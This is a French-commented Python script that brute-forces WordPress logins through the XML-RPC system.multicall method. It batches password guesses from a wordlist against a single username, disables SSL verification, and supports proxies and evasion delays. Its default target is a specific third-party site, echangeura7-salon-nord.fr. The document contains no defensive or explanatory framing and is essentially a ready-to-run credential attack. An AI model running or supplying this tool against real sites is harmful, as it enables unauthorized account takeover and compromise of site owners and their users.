import requests
import argparse
from time import sleep
import urllib3
from xml.sax.saxutils import escape

# 🔇 Ignore les warnings SSL
urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

# === ARGUMENTS ===
parser = argparse.ArgumentParser(description="Brute-force WordPress XML-RPC via system.multicall")
parser.add_argument("--user", required=True, help="Nom d'utilisateur à tester")
parser.add_argument("--wordlist", required=True, help="Fichier contenant la liste de mots de passe")
parser.add_argument("--url", default="https://www.echangeura7-salon-nord.fr/xmlrpc.php", help="URL de xmlrpc.php")
parser.add_argument("--batch", type=int, default=20, help="Nombre de tentatives par requête (défaut = 20)")
parser.add_argument("--delay", type=int, default=0, help="Temps d'attente (en secondes) entre chaque batch")
parser.add_argument("--proxy", help="Adresse du proxy HTTP(s), ex: http://127.0.0.1:8080")
parser.add_argument("--startfrom", type=int, default=0, help="Ignorer les X premières lignes de la wordlist")
parser.add_argument("--stop-on-success", action="store_true", help="Arrêter le script dès qu'un mot de passe valide est trouvé")
args = parser.parse_args()

XMLRPC_URL = args.url
USERNAME = args.user
WORDLIST = args.wordlist
USER_AGENT = "Mozilla/5.0"

# === TEMPLATE D'UNE REQUÊTE XML-RPC ===
def generate_call(password):
    safe_user = escape(USERNAME)
    safe_pw = escape(password)
    return f"""
    <value>
      <struct>
        <member><name>methodName</name><value><string>metaWeblog.getUsersBlogs</string></value></member>
        <member><name>params</name><value>
          <array><data>
            <value><array><data>
              <value><string>appkey</string></value>
              <value><string>{safe_user}</string></value>
              <value><string>{safe_pw}</string></value>
            </data></array></value>
          </data></array>
        </value></member>
      </struct>
    </value>
    """

def build_multicall(passwords):
    calls = "".join([generate_call(pw) for pw in passwords])
    return f"""<?xml version="1.0"?>
<methodCall>
  <methodName>system.multicall</methodName>
  <params>
    <param>
      <value>
        <array>
          <data>
            {calls}
          </data>
        </array>
      </value>
    </param>
  </params>
</methodCall>"""

# === CHARGEMENT DE MOTS DE PASSE AVEC STARTFROM ===
def load_passwords(path):
    with open(path, "r", encoding="utf-8") as f:
        for i, line in enumerate(f):
            if i < args.startfrom:
                continue
            pw = line.strip()
            if pw:
                yield pw

# === ANALYSE DES RÉPONSES ===
def parse_response(xml, passwords):
    chunks = xml.split("<struct>")[1:]
    for idx, pw in enumerate(passwords):
        if idx < len(chunks) and "faultCode" not in chunks[idx]:
            print(f"[💥] Success → {USERNAME}:{pw}")
            return True
    return False

# === ENVOI D'UN BATCH DE REQUÊTES ===
def process_batch(batch, headers, proxies):
    xml_payload = build_multicall(batch)
    try:
        response = requests.post(XMLRPC_URL, data=xml_payload.encode(), headers=headers, proxies=proxies, verify=False, timeout=20)
        if response.status_code == 200:
            success = parse_response(response.text, batch)
            if success and args.stop_on_success:
                print("\n[🛑] Mot de passe valide trouvé, arrêt immédiat demandé.")
                exit(0)
        else:
            print(f"[❌] Erreur HTTP : {response.status_code}")
    except requests.exceptions.RequestException as e:
        print(f"[❌] Erreur réseau : {e}")

# === MAIN ===
def bruteforce():
    passwords = load_passwords(WORDLIST)
    headers = {
        "Content-Type": "text/xml",
        "User-Agent": USER_AGENT
    }

    proxies = {"http": args.proxy, "https": args.proxy} if args.proxy else None
    batch = []
    count = args.startfrom

    for pw in passwords:
        batch.append(pw)
        count += 1

        if len(batch) == args.batch:
            print(f"\n[🔄] Tentatives {count - args.batch + 1} → {count}")
            process_batch(batch, headers, proxies)
            if args.delay:
                print(f"[⏳] Pause de {args.delay}s avant le prochain batch...")
                sleep(args.delay)
            batch = []

    if batch:
        print(f"\n[🔄] Dernier batch {count - len(batch) + 1} → {count}")
        process_batch(batch, headers, proxies)

if __name__ == "__main__":
    bruteforce()
